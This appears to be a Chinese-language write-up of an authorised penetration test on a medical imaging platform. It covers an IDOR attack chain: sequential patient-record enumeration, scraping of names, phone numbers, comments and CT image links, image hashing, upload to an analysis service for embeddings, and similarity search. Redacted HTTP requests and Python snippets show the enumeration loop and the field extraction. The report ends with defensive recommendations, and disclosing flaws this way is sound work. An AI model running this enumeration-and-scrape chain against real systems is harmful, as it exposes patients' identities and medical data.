# 医疗影像业务授权测试实战分析：患者数据枚举、影像链路扩散与相似检索利用

> **作者**: nullinject
> **测试目标**: 某医疗影像业务平台及其周边分析服务
> **漏洞类型**: IDOR / Sensitive Data Exposure / Chained Asset Abuse
> **严重程度**: 严重（Critical）
> **披露状态**: 已匿名化整理，仅保留授权测试经验

---

## 概述

本文记录了一次针对医疗影像业务系统的授权测试经验。

测试一开始看起来只是普通的对象访问控制问题：患者详情页使用连续编号，前台页面中包含姓名、联系方式、评论文本和影像引用。但随着排查深入，问题逐渐从“单个详情页越权”扩大为一条完整的数据利用链：**患者资料枚举 -> 影像样本获取 -> 评论与身份拼接 -> 周边分析服务返回结构化结果 -> 相似性检索反向定位目标样本**。

这类案例的危险之处，不在于某一个接口多复杂，而在于多个原本看似普通的小问题能够在真实业务里被自然串联。最终形成的不是单点信息泄露，而是一条可以持续利用的数据链路。

---

## 攻击链全景

```text
低权限登录会话
      │
      ▼
顺序患者详情页 /record/{id}
      │
      ├── 提取姓名、电话、评论文本
      ├── 解析页面中的影像资源引用
      └── 建立对象编号与页面字段映射
              │
              ▼
      下载影像样本并计算摘要
              │
              ▼
    向周边分析服务提交样本
              │
              ├── 返回 embedding / 结构化结果
              └── 支持相似检索 / 目标定位
                      │
                      ▼
      形成完整的数据利用链与影响面证明
```

---

## 漏洞技术细节

### 漏洞一：顺序对象标识导致患者详情页可枚举

目标系统的患者详情页采用连续资源编号。对授权测试来说，这类结构首先要验证的从来不是“能不能爆破”，而是“对象边界是否真正和当前用户绑定”。

测试结果表明，使用一个合法但低权限的会话后，请求不同编号的患者详情页时，系统会稳定返回完整页面内容，而不是只返回当前账号有权查看的对象。

**风险本质**：这是典型的 IDOR / 对象级访问控制缺失。攻击者不需要提权，也不需要注入，只需要枚举可预测的对象标识，就能触达本不应访问的数据。

### 漏洞二：详情页直接暴露高敏字段

在被访问到的详情页中，可稳定提取出以下业务字段：

- 患者姓名
- 联系方式
- 文本评论或诊疗反馈
- CT 影像引用地址

单独看这些字段，每一个都像普通业务内容；但一旦它们在同一对象下被拼接起来，风险等级就会迅速上升。姓名与电话构成身份定位，评论提供体验与情绪线索，影像引用则把问题推进到更敏感的医疗数据层面。

### 漏洞三：影像资源可被继续获取和摘要验证

详情页并不只是展示文本信息，还会引用对应影像资源。测试中可以从页面结构里稳定拿到影像引用，再下载样本进行本地摘要计算与最小化验证。

这里真正重要的不是“下载了多少图”，而是能够证明：

1. 某个对象编号确实能对应到一张具体影像
2. 影像能被稳定获取
3. 同一个对象与同一个影像之间存在可重复验证的映射关系

这意味着风险已经不再是抽象的“疑似暴露”，而是可以被证据链闭合的真实资产泄露。

### 漏洞四：评论内容可被二次归类并参与画像拼接

评论文本在这次测试里同样值得重视。它并不是独立存在的匿名内容，而是和患者对象、联系方式及影像记录处于同一页面上下文。

即使不使用复杂模型，仅靠人工抽样或最小化标签归类，也足以证明这些评论能够被进一步用作：

- 情绪倾向判断
- 服务体验分类
- 特定疾病或就诊线索的间接推断
- 与患者身份绑定后的行为画像补全

也就是说，评论字段的风险不在于它“只是几句文字”，而在于它已经进入了可拼接、可分析、可画像的数据结构里。

### 漏洞五：周边分析服务放大了影像泄露的实际危害

真正让这次测试从“后台越权”升级为“链路型风险”的，是影像样本还能进入周边分析服务。

在验证中，影像样本提交到周边服务后，可以返回 embedding 或其他结构化特征结果，并支持后续的相似性比对。此时风险就不再是“看到了某些医疗图像”，而是“这些图像已经可以被进一步检索、聚类、定位和再利用”。

一旦攻击者拥有这样的链路，原本分散在两个系统中的能力就会自动组合：业务系统负责暴露样本，分析系统负责放大样本价值。

---

## 复现过程（脱敏）

> ⚠️ 以下内容仅保留授权测试中的最小必要技术特征，已移除真实地址、凭据与可直接复用的利用细节。

### Step 1：验证患者详情页是否可枚举

测试首先使用合法低权限会话访问患者详情页。目标路径结构接近如下形式：

```http
GET /record/101 HTTP/1.1
Host: <redacted-host>
Cookie: session=<redacted>
```

随后对连续编号对象做抽样验证：

```http
GET /record/102 HTTP/1.1
GET /record/103 HTTP/1.1
GET /record/104 HTTP/1.1
```

如果多个对象都稳定返回完整页面，而非“无权访问”或最小化脱敏数据，就足以证明对象边界存在问题。

### Step 2：提取页面中的核心字段

页面结构中可以稳定定位出若干业务字段。脱敏后的解析逻辑类似：

```python
name = soup.find("dt", text="姓名").find_next("dd").text.strip()
phone = soup.find("dt", text="联系电话").find_next("dd").text.strip()
comment = soup.find("div", class_="review-box").text.strip()
image = soup.find("img", class_="ct-image")["src"]
```

这里的 payload 并不复杂，本质只是**利用系统原本就返回的页面结构完成字段抽取**。正因为如此，这类问题在真实环境里更危险：不需要高级注入，不需要复杂 bypass，只需要页面本身返回了不该返回的数据。

### Step 3：对影像样本做摘要验证

为了避免报告中直接保存大量原始影像，测试中只保留最小化摘要验证信息。例如：

```python
with open(sample_path, "rb") as f:
    digest = hashlib.md5(f.read()).hexdigest().lower()
```

摘要的意义在于证明“某个对象页面确实关联到某个稳定样本”，而不是为了复制更多敏感文件。

### Step 4：对评论内容做最小化归类

原始 WP 中这一步很朴素，核心就是把评论按倾向做最小分类。脱敏后可表达为：

```python
label = 1 if comment_is_positive(comment_text) else 0
writer.writerow([record_id, label])
```

这里真正重要的不是分类算法，而是它证明了：评论字段已经足以支持二次分析和用户画像推断。

### Step 5：将影像提交到周边分析服务

周边分析服务会接收影像样本并返回结构化结果。脱敏后的请求特征如下：

```http
POST /api/upload HTTP/1.1
Host: <redacted-analysis-service>
Content-Type: multipart/form-data
Cookie: session=<redacted>
```

返回结果会包含类似如下字段：

```json
{
  "success": true,
  "filename": "<redacted>.png",
  "embedding": [0.0123, -0.4412, 0.7741, ...]
}
```

这一步把“静态影像泄露”推进成了“可结构化处理的分析输入”。

### Step 6：进行相似性比对确认目标样本位置

获取 embedding 后，可对样本集合做余弦相似度计算，用来快速定位与目标最接近的记录：

```python
def cosine_similarity(a, b):
    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))
```

这一阶段的意义，不是炫技，而是帮助业务方直观看到：**一旦样本可进入检索链，攻击者就能从“看见数据”进一步走到“定位数据、组织数据、利用数据”。**

---

## Payload 示例（脱敏版）

为了和仓库中其他案例风格保持一致，下面保留几段“足够具体但不可直接复用”的 payload 片段，用来说明测试中真正起作用的不是某个高难度漏洞，而是链路本身。

### Payload A：对象枚举入口

```python
for record_id in range(1, 500):
    resp = session.get(f"https://<redacted-host>/record/{record_id}")
    if resp.status_code == 200 and "姓名" in resp.text:
        collect(resp.text)
```

**作用**：验证顺序对象标识是否可枚举，确认页面是否泄露敏感字段。

### Payload B：页面字段抽取

```python
payload = {
    "record_id": record_id,
    "name": extract_name(html),
    "phone": extract_phone(html),
    "comment": extract_comment(html),
    "image_ref": extract_image_src(html),
}
```

**作用**：把单个详情页中的身份、文本和影像引用拼成同一对象的数据包。

### Payload C：影像摘要映射

```python
payload = {
    "record_id": record_id,
    "image_digest": md5(sample_bytes).lower(),
}
```

**作用**：在不大量保留原始影像的前提下，建立对象和样本之间的最小证据映射。

### Payload D：评论倾向归类

```python
payload = {
    "record_id": record_id,
    "sentiment": 1 if is_positive(comment) else 0,
}
```

**作用**：证明评论字段已具备二次分析价值，而不只是普通展示文本。

### Payload E：分析服务输入与结构化输出

```python
files = {"file": open(sample_path, "rb")}
resp = requests.post("https://<redacted-analysis>/api/upload", files=files)
result = {
    "filename": resp.json()["filename"],
    "embedding": resp.json()["embedding"],
}
```

**作用**：验证影像样本可进入周边服务并被转化为结构化特征。

### Payload F：相似性检索闭环

```python
payload = {
    "target_digest": "<redacted-md5>",
    "top_match": "<redacted-sample>.json",
    "similarity": 0.98,
}
```

**作用**：证明目标样本能够被重新定位，从而形成完整的数据利用闭环。

---

## 漏洞影响分析

### 直接危害

| 资产 | 危害 |
|------|------|
| 患者身份信息 | 可被批量枚举与关联，形成高敏个人信息泄露 |
| 联系方式 | 可被用于精准识别、骚扰或进一步社工 |
| 评论文本 | 可被用作情绪分析、体验画像与疾病线索推断 |
| CT 影像 | 属于高敏医疗数据，一旦泄露影响严重 |
| embedding / 结构化结果 | 放大影像的可检索性和再利用价值 |

### 攻击面评估

- **影响范围**：所有可被枚举到的患者对象及其关联影像
- **利用难度**：低到中（不依赖复杂漏洞利用，更多依赖链路拼接）
- **检测难度**：中（单看每个请求都像正常业务访问）
- **可扩展性**：高（可继续延伸到检索、聚类、画像、目标定位等利用场景）

---

## 防御建议

### 对业务系统开发团队

1. **补齐对象级授权校验**：每个详情页对象都要绑定当前用户的真实访问范围，而不是只验证“已登录”
2. **最小化字段返回**：前台页面只返回当前角色真正需要的字段，避免把姓名、电话、评论和影像引用同时暴露
3. **影像访问加签或短时授权**：不要让静态资源通过可长期复用的直接引用暴露
4. **建立访问频率与对象跨度监控**：识别低权限账号对大量连续对象的访问行为

### 对周边分析服务团队

1. **限制样本输入来源**：只允许来自可信业务流程的样本进入分析服务
2. **对 embedding / 检索接口做强鉴权**：避免分析能力成为泄露放大器
3. **记录样本来源链路**：明确某个 embedding 来自哪个对象、何时生成、由谁提交
4. **避免把原始文件名、稳定标识或敏感映射直接返回给前台**

### 对安全测试与报告撰写

1. **保留最小必要证据**，不要在报告中堆砌大量患者原始数据
2. **优先给出链路判断**，而不是只列单点接口问题
3. **将摘要、映射和最小样本作为主要证据形式**，减少二次泄露风险

---

## 总结

这次测试最值得记录下来的，不是某段脚本，而是这条利用链本身：

- 对象可枚举
- 页面泄露高敏字段
- 影像样本可被继续获取
- 周边分析服务可继续加工这些样本
- 相似检索能力进一步放大影响

也就是说，这不是单一的“后台越权”问题，而是一种非常典型的**链路型数据风险**。当对象授权、敏感字段暴露、静态资源访问和分析能力同时失守时，攻击面会从单点缺陷迅速演化为完整的数据利用链。

---

*本文仅保留授权测试中的经验与方法论，不包含真实目标标识、访问凭据或可直接复用的利用细节。*
